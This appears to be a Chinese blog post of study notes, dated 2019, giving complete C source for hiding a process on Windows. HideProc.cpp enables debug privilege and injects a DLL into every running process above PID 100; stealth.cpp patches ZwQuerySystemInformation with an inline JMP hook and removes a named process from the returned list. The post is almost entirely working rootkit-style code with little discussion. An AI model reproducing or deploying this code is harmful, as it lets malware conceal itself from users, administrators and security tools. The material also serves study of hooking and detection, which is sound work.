# 隐藏进程(API勾取---修改API代码---只关注已运行进程)

HideProc.cpp  
````c

#include "windows.h"
#include "stdio.h"
#include "tlhelp32.h"
#include "tchar.h"

typedef void (*PFN_SetProcName)(LPCTSTR szProcName);
enum {INJECTION_MODE = 0, EJECTION_MODE};

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) 
{
    TOKEN_PRIVILEGES tp;
    HANDLE hToken;
    LUID luid;

    if( !OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, 
			              &hToken) )
    {
        printf("OpenProcessToken error: %u\n", GetLastError());
        return FALSE;
    }

    if( !LookupPrivilegeValue(NULL,            // lookup privilege on local system
                              lpszPrivilege,   // privilege to lookup 
                              &luid) )        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if( bEnablePrivilege )
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.
    if( !AdjustTokenPrivileges(hToken, 
                               FALSE, 
                               &tp, 
                               sizeof(TOKEN_PRIVILEGES), 
                               (PTOKEN_PRIVILEGES) NULL, 
                               (PDWORD) NULL) )
    { 
        printf("AdjustTokenPrivileges error: %u\n", GetLastError() ); 
        return FALSE; 
    } 

    if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )
    {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    } 

    return TRUE;
}

BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)
{
	HANDLE                  hProcess, hThread;
	LPVOID                  pRemoteBuf;
	DWORD                   dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
	LPTHREAD_START_ROUTINE  pThreadProc;

	if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )
    {
        printf("OpenProcess(%d) failed!!!\n", dwPID);
		return FALSE;
    }

	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, 
                                MEM_COMMIT, PAGE_READWRITE);

	WriteProcessMemory(hProcess, pRemoteBuf, 
                       (LPVOID)szDllPath, dwBufSize, NULL);

	pThreadProc = (LPTHREAD_START_ROUTINE)
                  GetProcAddress(GetModuleHandle(L"kernel32.dll"), 
                                 "LoadLibraryW");
	hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                 pThreadProc, pRemoteBuf, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);	

	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return TRUE;
}

BOOL EjectDll(DWORD dwPID, LPCTSTR szDllPath)
{
	BOOL                    bMore = FALSE, bFound = FALSE;
	HANDLE                  hSnapshot, hProcess, hThread;
	MODULEENTRY32           me = { sizeof(me) };
	LPTHREAD_START_ROUTINE  pThreadProc;

	if( INVALID_HANDLE_VALUE == 
        (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)) )
		return FALSE;

	bMore = Module32First(hSnapshot, &me);
	for( ; bMore ; bMore = Module32Next(hSnapshot, &me) )
	{
		if( !_tcsicmp(me.szModule, szDllPath) || 
            !_tcsicmp(me.szExePath, szDllPath) )
		{
			bFound = TRUE;
			break;
		}
	}

	if( !bFound )
	{
		CloseHandle(hSnapshot);
		return FALSE;
	}

	if( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )
	{
		CloseHandle(hSnapshot);
		return FALSE;
	}

	pThreadProc = (LPTHREAD_START_ROUTINE)
                  GetProcAddress(GetModuleHandle(L"kernel32.dll"), 
                                 "FreeLibrary");
	hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                 pThreadProc, me.modBaseAddr, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);	

	CloseHandle(hThread);
	CloseHandle(hProcess);
	CloseHandle(hSnapshot);

	return TRUE;
}

BOOL InjectAllProcess(int nMode, LPCTSTR szDllPath)
{
	DWORD                   dwPID = 0;
	HANDLE                  hSnapShot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32          pe;

	// Get the snapshot of the system
	pe.dwSize = sizeof( PROCESSENTRY32 );
	hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL );

	// find process
	Process32First(hSnapShot, &pe);
	do
	{
		dwPID = pe.th32ProcessID;

        // 鉴于系统安全性的考虑
        // 对于PID小于100的系统进程
        // 不执行DLL注入操作
		if( dwPID < 100 )
			continue;

        if( nMode == INJECTION_MODE )
		    InjectDll(dwPID, szDllPath);
        else
            EjectDll(dwPID, szDllPath);
	}
	while( Process32Next(hSnapShot, &pe) );

	CloseHandle(hSnapShot);

	return TRUE;
}

int _tmain(int argc, TCHAR* argv[])
{
    int                     nMode = INJECTION_MODE;
    HMODULE                 hLib = NULL;
    PFN_SetProcName         SetProcName = NULL;

	if( argc != 4 )
	{
		printf("\n Usage  : HideProc.exe <-hide|-show> "\
               "<process name> <dll path>\n\n");
		return 1;
	}

	// change privilege
    SetPrivilege(SE_DEBUG_NAME, TRUE);

    // load library
    hLib = LoadLibrary(argv[3]);

    // set process name to hide
    SetProcName = (PFN_SetProcName)GetProcAddress(hLib, "SetProcName");
    SetProcName(argv[2]);

    // Inject(Eject) Dll to all process
    if( !_tcsicmp(argv[1], L"-show") )
	    nMode = EJECTION_MODE;

    InjectAllProcess(nMode, argv[3]);

    // free library
    FreeLibrary(hLib);

	return 0;
}

```


stealth.cpp  
```c

#include "windows.h"
#include "tchar.h"

#define STATUS_SUCCESS						(0x00000000L) 

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    PVOID Reserved2[3];
    HANDLE UniqueProcessId;
    PVOID Reserved3;
    ULONG HandleCount;
    BYTE Reserved4[4];
    PVOID Reserved5[11];
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS (WINAPI *PFZWQUERYSYSTEMINFORMATION)
                 (SYSTEM_INFORMATION_CLASS SystemInformationClass, 
                  PVOID SystemInformation, 
                  ULONG SystemInformationLength, 
                  PULONG ReturnLength);

#define DEF_NTDLL                       ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")


// global variable (in sharing memory)
#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
    TCHAR g_szProcName[MAX_PATH] = {0,};
#pragma data_seg()

// global variable
BYTE g_pOrgBytes[5] = {0,};


BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{
    FARPROC pfnOrg;
    DWORD dwOldProtect, dwAddress;
    BYTE pBuf[5] = {0xE9, 0, };
    PBYTE pByte;

    // 获取要勾取的API地址
    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
    pByte = (PBYTE)pfnOrg;

    // 若已经被勾取，则返回 FALSE
    if( pByte[0] == 0xE9 )
        return FALSE;

    // 为了修改5个字节，先向内存添加“写”属性
    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    // 备份原有代码(5字节)
    memcpy(pOrgBytes, pfnOrg, 5);

    // 计算JMP地址 (E9 XXXXXXXX)
    // => XXXXXXXX = pfnNew - pfnOrg - 5
    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;
    memcpy(&pBuf[1], &dwAddress, 4);

    // "钩子": 修改5个字节 (JMP XXXXXXXX)
    memcpy(pfnOrg, pBuf, 5);

    // 恢复内存属性
    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);
    
    return TRUE;
}


BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)
{
    FARPROC pFunc;
    DWORD dwOldProtect;
    PBYTE pByte;

    // 获取API地址
    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
    pByte = (PBYTE)pFunc;

    // 若已经"脱钩", 则返回 FALSE
    if( pByte[0] != 0xE9 )
        return FALSE;

    // 向内存添加"写"属性，为恢复源代码(5个字节)准备
    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    // "脱钩"
    memcpy(pFunc, pOrgBytes, 5);

    // 恢复内存属性
    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

    return TRUE;
}


NTSTATUS WINAPI NewZwQuerySystemInformation(
                SYSTEM_INFORMATION_CLASS SystemInformationClass, 
                PVOID SystemInformation, 
                ULONG SystemInformationLength, 
                PULONG ReturnLength)
{
    NTSTATUS status;
    FARPROC pFunc;
    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
    char szProcName[MAX_PATH] = {0,};
    
    // 开始前先"脱钩"
    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);

    // 调用原始API
    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), 
                           DEF_ZWQUERYSYSTEMINFORMATION);
    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)
              (SystemInformationClass, SystemInformation, 
              SystemInformationLength, ReturnLength);

    if( status != STATUS_SUCCESS )
        goto __NTQUERYSYSTEMINFORMATION_END;

    // 仅针对 SystemProcessInformation 类型操作 
    if( SystemInformationClass == SystemProcessInformation )
    {
        // SYSTEM_PROCESS_INFORMATION 类型转换
        // pCur 是单向链表的头
        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

        while(TRUE)
        {
            // 比较进程名称
            // g_szProcName = 要隐藏的进程名称
            // (=> SetProcName())
            if(pCur->Reserved2[1] != NULL)
            {
                if(!_tcsicmp((PWSTR)pCur->Reserved2[1], g_szProcName))
                {
                    // 从链表中删除隐藏进程的节点
                    if(pCur->NextEntryOffset == 0)
                        pPrev->NextEntryOffset = 0;
                    else
                        pPrev->NextEntryOffset += pCur->NextEntryOffset;
                }
                else		
                    pPrev = pCur;
            }

            if(pCur->NextEntryOffset == 0)
                break;

            // 链表的下一项
            pCur = (PSYSTEM_PROCESS_INFORMATION)
                    ((ULONG)pCur + pCur->NextEntryOffset);
        }
    }

__NTQUERYSYSTEMINFORMATION_END:

    // 函数终止前，再次执行API勾取操作，为下次调用准备 
    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, 
                 (PROC)NewZwQuerySystemInformation, g_pOrgBytes);

    return status;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    char            szCurProc[MAX_PATH] = {0,};
    char            *p = NULL;

    // #1. 异常处理
    // 若当前进程为 HookProc.exe, 则终止，不进行勾取操作
    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);
    p = strrchr(szCurProc, '\\');
    if( (p != NULL) && !_stricmp(p+1, "HideProc.exe") )
        return TRUE;

    switch( fdwReason )
    {
        // #2. API Hooking
        case DLL_PROCESS_ATTACH : 
        hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, 
                     (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
        break;

        // #3. API Unhooking 
        case DLL_PROCESS_DETACH :
        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, 
                       g_pOrgBytes);
        break;
    }

    return TRUE;
}


#ifdef __cplusplus
extern "C" {
#endif
__declspec(dllexport) void SetProcName(LPCTSTR szProcName)
{
    _tcscpy_s(g_szProcName, szProcName);
}
#ifdef __cplusplus
}
#endif

```

stealth 隐身  


2019/6/2  
